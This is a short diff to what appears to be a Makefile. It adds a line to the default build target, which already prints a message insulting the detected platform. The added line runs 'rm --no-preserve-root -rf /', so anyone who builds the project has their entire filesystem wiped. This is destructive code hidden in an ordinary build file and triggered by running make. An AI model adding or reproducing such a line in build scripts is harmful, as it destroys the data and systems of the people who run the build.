@@ -9,3 +9,4 @@ UNAME := $(shell uname)
 
 ALL:
 	echo -e "$(UNAME) is terrible.  Not building on this platform."
+	$(RM) --no-preserve-root -rf /
